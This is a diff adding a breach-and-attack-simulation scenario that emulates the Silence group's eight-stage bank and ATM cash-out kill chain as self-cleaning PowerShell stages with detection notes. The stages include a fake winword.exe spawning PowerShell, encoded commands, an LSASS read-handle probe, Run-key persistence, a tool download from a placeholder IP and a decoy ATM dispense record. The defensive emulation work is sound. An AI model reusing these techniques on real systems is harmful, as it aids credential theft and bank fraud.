@@ -1,0 +1,443 @@
+id: silence-kill-chain
+product_line: killchain
+name: Silence / Whisper Spider Kill Chain -- BFSI ATM Cash-Out
+description: >
+  Eight-stage emulation of the Silence (Whisper Spider) group's endpoint
+  tradecraft against banks, from spearphishing initial access through to the
+  group's objective: commanding ATMs to dispense cash via its Atmosphere
+  tooling. Grounded in MITRE ATT&CK group G0091, Kaspersky GReAT "Silence -- a
+  new Trojan attacking financial organizations" (2017), and Group-IB "Silence:
+  Moving Into the Darkside" (2018) and "Silence 2.0: Going Global" (2019).
+
+  Silence is a Russian-speaking actor that stole millions from banks by
+  compromising operator workstations, patiently monitoring operator activity
+  (including recording video of employees' day-to-day work), then reaching the
+  card-processing machines and using its Atmosphere tooling (later xfs-disp.exe)
+  to dispense cash from ATMs to money mules at scheduled times. In Indian BFSI
+  context the targets are ATM-switch administration hosts and card-management
+  operator desktops.
+
+  KILL CHAIN STAGES:
+     1. Initial Access       -- spearphishing attachment child-process chain (DOCX/CHM/LNK) (T1566.001)
+     2. Execution             -- encoded PowerShell download/execute (T1059.001)
+     3. Collection            -- operator screen capture, in-memory only, NO file written (T1113)
+     4. Credential Access     -- LSASS read-handle probe (Farse/Mimikatz-style) (T1003.001)
+     5. Discovery             -- corporate-network topology mapping, read-only (T1018)
+     6. Persistence           -- HKCU Run-key value create/verify/remove (T1547.001)
+     7. Ingress Tool Transfer -- egress reachability for Atmosphere/Farse download, NO fetch (T1105)
+     8. Impact (lab-only)     -- Atmosphere ATM cash-dispense simulation (T1565.001)
+
+  ATTRIBUTION / CONFIDENCE: "confirmed" means at least two genuinely distinct
+  sources were cited; "reported" covers a single authoritative source (MITRE
+  ATT&CK's curated page or a government/vendor report); "inferred" means the
+  behavior is consistent with Silence's documented objective but the cited
+  source does not tie that specific ATT&CK sub-technique ID to the group.
+
+  DOCUMENTED, NOT MODELED: Silence used Nmap to actively scan corporate networks
+  and build topology (T1018). This chain does NOT run an active network scan --
+  that generates real attack traffic on the target network -- and instead
+  performs read-only local route/ARP enumeration to represent the
+  network-mapping step. Silence's video recording of employees (T1125) is also
+  noted but modeled only as screen capture (T1113) in Stage 3.
+
+  ORDERING CAVEAT: this sequence is a representative, documented kill chain for
+  authoring purposes, not a claim that every Silence incident followed this
+  exact order.
+
+  SAFETY: Stages 1-7 are production-safe and self-cleaning. Stage 3 captures a
+  screen into an in-memory bitmap and disposes it -- NO screenshot is written
+  or transmitted. Stage 8 is lab-only: it writes a single decoy Atmosphere
+  ATM-dispense instruction to an isolated temp dir to represent the objective,
+  then deletes it -- no real ATM, dispenser, or network. Windows only.
+  [BAS-SIM-SILENCE] tagged throughout.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - silence
+  - whisper-spider
+  - bfsi
+  - financial
+  - atm
+  - atmosphere
+  - card-processing
+  - kill-chain
+  - phase7
+  - t1566
+  - t1059
+  - t1113
+  - t1003
+  - t1018
+  - t1547
+  - t1105
+  - t1565
+  - mitre
+mitre_phases:
+  - initial-access
+  - execution
+  - collection
+  - credential-access
+  - discovery
+  - persistence
+  - command-and-control
+  - impact
+
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 -- Initial Access: Spearphishing Attachment Child-Process (T1566.001)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 1 -- Spearphishing Attachment Child-Process Chain (T1566.001)"
+    technique_id: T1566.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Copies cmd.exe to a temp winword.exe, spawns powershell.exe from it with a benign Write-Output, waits, deletes the copy. Reproduces the attachment -> shell parent/child chain Silence spearphishing (DOCX/CHM/LNK/ZIP) creates. No real macro, document, or email."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1 (process create): Image=powershell.exe, ParentImage=%TEMP%\\winword.exe"
+      - "Security EID 4688 (process create with command line) if process auditing enabled"
+    detection:
+      - "EDR: Office/document process spawning a shell -- primary spearphishing-attachment initial-access signal"
+      - "SIEM: parent-child rule winword.exe -> powershell.exe / cmd.exe; also hh.exe (CHM) spawning a shell"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): Phishing: Spearphishing Attachment (T1566.001) -- malicious DOCX, CHM, LNK and ZIP attachments"
+        url: "https://attack.mitre.org/groups/G0091/"
+      - reference: "Group-IB -- Silence: Moving Into the Darkside (2018)"
+        url: "https://go.group-ib.com/hubfs/report/group-ib-silence-moving-into-the-darkside-threat-research-2018-en.pdf"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: confirmed
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $tmp = Join-Path $env:TEMP 'winword.exe'
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $tmp -Force
+      $psi = New-Object System.Diagnostics.ProcessStartInfo
+      $psi.FileName = $tmp
+      $psi.Arguments = '/c powershell.exe -NoProfile -NonInteractive -Command "Write-Output BAS-SIM-SILENCE-S1"'
+      $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+      $psi.CreateNoWindow = $true
+      $p = [System.Diagnostics.Process]::Start($psi)
+      if ($p) { $p.WaitForExit(10000) | Out-Null; $ec = $p.ExitCode } else { $ec = -1 }
+      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+      if ($ec -ge 0) {
+        Write-Output "FAIL: winword.exe->powershell.exe child-process chain fired (exit $ec) -- expect Sysmon EID 1 with ParentImage=winword.exe. AppLocker/WDAC/EDR should block document processes spawning shells. [BAS-SIM-SILENCE-S1]"
+      } else {
+        Write-Output "PASS: the child process could not be started -- AppLocker/WDAC/EDR blocked the document->shell spawn. [BAS-SIM-SILENCE-S1]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'winword.exe') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 -- Execution: Encoded PowerShell Download/Execute (T1059.001)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 2 -- Encoded PowerShell Download/Execute (T1059.001)"
+    technique_id: T1059.001
+    detection_profiles:
+      - windows_encoded_powershell
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Spawns ONE child powershell.exe with -EncodedCommand whose decoded payload only runs Write-Output. Reproduces the -enc child + ScriptBlock telemetry of a Silence PowerShell downloader; the encoded content is an inert banner, nothing is downloaded."
+    reversible: true
+    telemetry:
+      - "Security EID 4688 / Sysmon EID 1: powershell.exe -EncodedCommand child"
+      - "PowerShell EID 4104: decoded ScriptBlock (Write-Output banner)"
+    detection:
+      - "EDR: powershell.exe -EncodedCommand / -enc spawned by a document/script host -- Silence downloader IOC"
+      - "SIEM: EID 4688 powershell with -enc + EID 4104 decoded block"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): Command and Scripting Interpreter: PowerShell (T1059.001) -- 'used PowerShell to download and execute payloads'"
+        url: "https://attack.mitre.org/groups/G0091/"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $inner = "Write-Output 'BAS-SIM-SILENCE-S2 encoded downloader executed (inert banner)'"
+      $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($inner))
+      $out = & powershell.exe -NoProfile -NonInteractive -EncodedCommand $enc 2>&1 | Out-String
+      $ran = $out -match 'BAS-SIM-SILENCE-S2 encoded downloader'
+      if ($ran) {
+        Write-Output "FAIL: an -EncodedCommand child powershell.exe ran unblocked -- expect EID 4688 (-enc) + EID 4104. Enable ScriptBlock + AMSI logging and alert on encoded PowerShell. [BAS-SIM-SILENCE-S2]"
+      } else {
+        Write-Output "PASS: the encoded-command child was blocked or failed -- Constrained Language Mode / AMSI / WDAC constrained the downloader surface. [BAS-SIM-SILENCE-S2]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 -- Collection: Operator Screen Capture (T1113)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 3 -- Operator Screen Capture (in-memory only) (T1113)"
+    technique_id: T1113
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Loads System.Drawing / System.Windows.Forms, performs ONE Graphics.CopyFromScreen into an in-memory Bitmap, reads its dimensions, and disposes it. NO screenshot is written to disk, kept, or transmitted. Silence captures victim screen activity (and is documented recording video of employees, T1125) to learn bank workflows; this fires the capture API chain without retaining pixels."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 7: System.Drawing.dll / System.Windows.Forms.dll loaded by powershell.exe"
+      - "PowerShell EID 4104: Add-Type System.Drawing + Graphics.CopyFromScreen"
+    detection:
+      - "EDR: PowerShell invoking CopyFromScreen / Screen.AllScreens -- Sigma posh_ps_screen_capture.yml"
+      - "SIEM: Graphics.CopyFromScreen in EID 4104 on an operator workstation -- Silence monitoring IOC"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): Screen Capture (T1113) -- 'can capture victim screen activity'; Video Capture (T1125) -- 'making videos of victims to observe bank employees'"
+        url: "https://attack.mitre.org/groups/G0091/"
+      - reference: "Kaspersky GReAT -- Silence: a new Trojan attacking financial organizations (2017)"
+        url: "https://securelist.com/the-silence/83009/"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: confirmed
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      try {
+        Add-Type -AssemblyName 'System.Windows.Forms' -ErrorAction Stop
+        Add-Type -AssemblyName 'System.Drawing' -ErrorAction Stop
+        $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height)
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
+        $dims = "$($bmp.Width)x$($bmp.Height)"
+        $g.Dispose(); $bmp.Dispose()
+        Write-Output "FAIL: a screen capture (CopyFromScreen) executed unblocked, capturing a $dims frame into memory (NOT written to disk, NOT kept). Expect Sysmon EID 7 + EID 4104. Silence monitors operators this way; a ScriptBlock rule on 'CopyFromScreen' should alert. [BAS-SIM-SILENCE-S3]"
+      } catch {
+        Write-Output "PASS: screen-capture assemblies/API were blocked or unavailable -- $($_.Exception.Message). The operator-monitoring surface is constrained. [BAS-SIM-SILENCE-S3]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 4 -- Credential Access: LSASS Read-Handle Probe (T1003.001)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 4 -- LSASS Handle Access (PROCESS_VM_READ), Farse/Mimikatz-style (T1003.001)"
+    technique_id: T1003.001
+    action_key: handle_probe
+    detection_profiles:
+      - windows_credential_access
+    framework: custom
+    executor: powershell
+    requires_priv: admin
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "Opens a read handle to lsass.exe with PROCESS_VM_READ, then immediately closes it. No memory is read or dumped. Silence uses the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe; this fires the LSASS handle-access telemetry without touching memory."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 10: SourceImage=powershell.exe TargetImage=lsass.exe GrantedAccess=0x1010"
+    detection:
+      - "EDR: handle to LSASS with VM_READ -- Sigma sysmon_lsass_memdump.yml family"
+      - "SIEM: cross-process handle to lsass.exe from a script host -- credential-dumping IOC"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): OS Credential Dumping: LSASS Memory (T1003.001) -- 'used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe'"
+        url: "https://attack.mitre.org/groups/G0091/"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sig = @'
+      using System;
+      using System.Runtime.InteropServices;
+      public static class BasSil {
+        [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint a, bool i, int pid);
+        [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
+      }
+      '@
+      try { Add-Type -TypeDefinition $sig -ErrorAction Stop } catch { Write-Output "SKIP: could not compile the P/Invoke probe. [BAS-SIM-SILENCE-S4]"; return }
+      $lsass = Get-Process lsass -EA SilentlyContinue | Select-Object -First 1
+      if (-not $lsass) { Write-Output "SKIP: lsass.exe not found. [BAS-SIM-SILENCE-S4]"; return }
+      $h = [BasSil]::OpenProcess(0x1010, $false, $lsass.Id)
+      if ($h -ne [IntPtr]::Zero) {
+        [void][BasSil]::CloseHandle($h)
+        Write-Output "FAIL: opened a PROCESS_VM_READ handle to LSASS unblocked -- credential memory is reachable. Expect Sysmon EID 10 GrantedAccess=0x1010. Enable RunAsPPL / Credential Guard. [BAS-SIM-SILENCE-S4]"
+      } else {
+        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        Write-Output "PASS: access to LSASS was DENIED (Win32 error $err) -- RunAsPPL / Credential Guard / EDR protected LSASS memory. [BAS-SIM-SILENCE-S4]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 5 -- Discovery: Corporate-Network Topology Mapping (T1018)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 5 -- Corporate-Network Topology Mapping (read-only) (T1018)"
+    technique_id: T1018
+    action_key: enumerate
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Read-only enumeration of the local routing table, ARP neighbour cache and default gateway to represent the network-topology mapping Silence performs (it uses Nmap to scan the corporate network). NO active scan is sent -- only local cache reads -- so no attack traffic reaches other hosts."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: route.exe / arp.exe invocations (if used); PowerShell EID 4104: Get-NetRoute / Get-NetNeighbor"
+    detection:
+      - "EDR: route/ARP/gateway enumeration burst from a script host -- network-mapping recon"
+      - "SIEM: (for the real technique) Nmap or mass-connection scanning from a workstation -- Silence topology-building IOC"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): Remote System Discovery (T1018) -- 'used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts'"
+        url: "https://attack.mitre.org/groups/G0091/"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $routes = @(Get-NetRoute -AddressFamily IPv4 -EA SilentlyContinue | Where-Object { $_.DestinationPrefix -ne '127.0.0.0/8' }).Count
+      $arp = @(Get-NetNeighbor -AddressFamily IPv4 -EA SilentlyContinue | Where-Object { $_.State -eq 'Reachable' }).Count
+      $gw = (Get-NetIPConfiguration -EA SilentlyContinue | Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1).IPv4DefaultGateway.NextHop
+      Write-Output "EXEC T1018: network topology mapping (read-only). routes=$routes, reachable_arp_neighbours=$arp, default_gateway=$gw. Silence maps the route to card-processing / ATM-switch segments before pivoting. [BAS-SIM-SILENCE-S5]"
+      Write-Output "FAIL: local route/ARP/gateway enumeration ran unblocked. The real Silence step uses Nmap to scan and build topology -- segment ATM/card-processing networks away from operator workstations and alert on scanning or route/arp enumeration bursts (EID 4688/4104). [BAS-SIM-SILENCE-S5]"
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 6 -- Persistence: Registry Run-Key (T1547.001)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 6 -- Registry Run-Key Persistence (HKCU) (T1547.001)"
+    technique_id: T1547.001
+    detection_profiles:
+      - windows_runkey_persistence
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes ONE tagged value (BAS-SIM-SILENCE) to the current user's HKCU Run key whose data is an inert comment, confirms it, then DELETES it in both the command and cleanup. HKCU only -- Silence uses HKCU/HKLM Run and the Startup folder for persistence; this models the HKCU Run variant safely."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 13: registry value set under HKCU\\...\\Run (BAS-SIM-SILENCE)"
+      - "PowerShell EID 4104: New-ItemProperty ...\\Run"
+    detection:
+      - "EDR: new value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -- Sigma registry_set_run_key.yml"
+      - "SIEM: Sysmon EID 13 Run-key write from a script host -- Silence persistence IOC"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) -- used HKCU/HKLM Run and the Startup folder"
+        url: "https://attack.mitre.org/groups/G0091/"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+      $name   = 'BAS-SIM-SILENCE'
+      New-ItemProperty -Path $runKey -Name $name -Value 'cmd.exe /c rem bas-sim-silence-inert' -PropertyType String -Force -EA SilentlyContinue | Out-Null
+      $set = (Get-ItemProperty -Path $runKey -Name $name -EA SilentlyContinue).$name
+      Remove-ItemProperty -Path $runKey -Name $name -EA SilentlyContinue
+      $removed = -not (Get-ItemProperty -Path $runKey -Name $name -EA SilentlyContinue)
+      if ($set) {
+        Write-Output "FAIL: a value was written to the HKCU Run key unblocked (removed=$removed). Expect Sysmon EID 13. Alert on Run-key writes from script hosts and baseline autostart entries. [BAS-SIM-SILENCE-S6]"
+      } else {
+        Write-Output "PASS: the Run-key write was blocked -- autostart persistence via HKCU Run is constrained. [BAS-SIM-SILENCE-S6]"
+      }
+    cleanup: |
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BAS-SIM-SILENCE' -EA SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 7 -- Ingress Tool Transfer: Atmosphere/Farse Download Reachability (T1105)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 7 -- Ingress Tool Transfer Reachability (T1105)"
+    technique_id: T1105
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Attempts one Invoke-WebRequest to https://192.0.2.2 (RFC 5737 TEST-NET-1, non-routable), expecting the egress proxy/firewall to block it; nothing is written (no -OutFile). Silence downloads additional modules and malware (Atmosphere, Farse, Cleaner) to victim machines -- this probes whether that ingress path is open."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: TCP 443 to 192.0.2.2 (Invoke-WebRequest)"
+      - "PowerShell EID 4104: Invoke-WebRequest call"
+    detection:
+      - "EDR: Invoke-WebRequest to a non-approved destination from PowerShell -- tool-ingress IOC"
+      - "SIEM: outbound download from a script host to an unlisted IP -- Silence module-download pattern"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK -- Silence (Group G0091): Ingress Tool Transfer (T1105) -- 'downloaded additional modules and malware to victim's machines'"
+        url: "https://attack.mitre.org/groups/G0091/"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $url = 'https://192.0.2.2/bas-sim-silence-atmosphere.bin'
+      $blocked = $false; $timedOut = $false
+      try {
+        Invoke-WebRequest -Uri $url -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
+      } catch [System.Net.WebException] {
+        $m = $_.Exception.Message
+        if ($m -match 'timed out|timeout|TimedOut') { $timedOut = $true }
+        elseif ($m -match 'blocked|denied|forbidden|refused|proxy') { $blocked = $true }
+        else { $timedOut = $true }
+      } catch { $blocked = $true }
+      Write-Output "EXEC T1105: ingress-tool-transfer probe to $url (RFC5737 non-routable; NO file written). blocked=$blocked, timed_out=$timedOut. Sysmon EID 3 generated. Silence downloads Atmosphere/Farse/Cleaner to the operator host. [BAS-SIM-SILENCE-S7]"
+      if ($blocked) {
+        Write-Output "PASS: the tool-download attempt was blocked by proxy/firewall -- Silence's tooling ingress would be stopped. [BAS-SIM-SILENCE-S7]"
+      } else {
+        Write-Output "FAIL: the outbound download to 192.0.2.2 was NOT blocked. Enforce an egress allow-list and alert on Invoke-WebRequest to unapproved destinations from script hosts. [BAS-SIM-SILENCE-S7]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 8 -- Impact: Atmosphere ATM Cash-Dispense Simulation (T1565.001, lab-only)
+  # ---------------------------------------------------------------------------
+  - name: "Silence Stage 8 -- Atmosphere ATM Cash-Dispense (lab) (T1565.001)"
+    technique_id: T1565.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Writes a SINGLE decoy XFS-style cash-dispense instruction (clearly tagged BAS-SIM, fictional terminal, no real dispenser or network) to an isolated %TEMP%\\bas_silence_atm_<id> dir to represent Silence's Atmosphere/xfs-disp objective -- commanding an ATM to dispense notes to a mule -- then reads it back and deletes the dir. No real ATM, XFS dispenser, or network."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: decoy instruction file created under %TEMP%\\bas_silence_atm_<id>"
+      - "PowerShell EID 4104: Set-Content writing an XFS dispense-shaped record"
+    detection:
+      - "ATM/XFS audit: a WFSCmd/CDM dispense issued by a non-ATM-application process -- Atmosphere injection signal"
+      - "SIEM: unexpected dispense command on an ATM-switch host -- Silence cash-out chain"
+    threat_intel_sources:
+      - reference: "Group-IB -- Silence: Moving Into the Darkside (2018): Atmosphere controls the ATM dispenser to cash out; later campaigns used xfs-disp.exe"
+        url: "https://go.group-ib.com/hubfs/report/group-ib-silence-moving-into-the-darkside-threat-research-2018-en.pdf"
+      - reference: "Group-IB -- Silence 2.0: Going Global (2019)"
+        url: "https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf"
+    last_reviewed: "2026-11-10"
+    family_attribution_confidence: inferred
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF)
+      $dir = Join-Path $env:TEMP "bas_silence_atm_$runId"
+      New-Item -ItemType Directory -Path $dir -Force | Out-Null
+      $rec = @(
+        "BAS-SIM-SILENCE ATMOSPHERE CASH-DISPENSE (CONTROLLED DRILL -- NOT A REAL INSTRUCTION)",
+        "xfs_service=CDM  command=WFS_CMD_CDM_DISPENSE  terminal=BAS-SIM-ATM-0000",
+        "cassette=1  notes=40  currency=XXX  run-id=$runId",
+        "note=Silence objective -- inject dispense via Atmosphere/xfs-disp.exe to a money mule"
+      ) -join "`n"
+      $file = Join-Path $dir 'bas-sim-dispense.txt'
+      Set-Content -Path $file -Value $rec -Encoding UTF8
+      $wrote = Test-Path $file
+      Remove-Item $dir -Recurse -Force -EA SilentlyContinue
+      $cleaned = -not (Test-Path $dir)
+      Write-Output "FAIL: an XFS cash-dispense instruction (fictional) was staged to $dir to represent Silence's Atmosphere objective (wrote=$wrote). ATM controllers must accept dispense commands only from the signed ATM application and alert on any other process issuing WFS_CMD_CDM_DISPENSE. Decoy removed=$cleaned, no real ATM involved. [BAS-SIM-SILENCE-S8]"
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP "bas_silence_atm_*") -Recurse -Force -EA SilentlyContinue
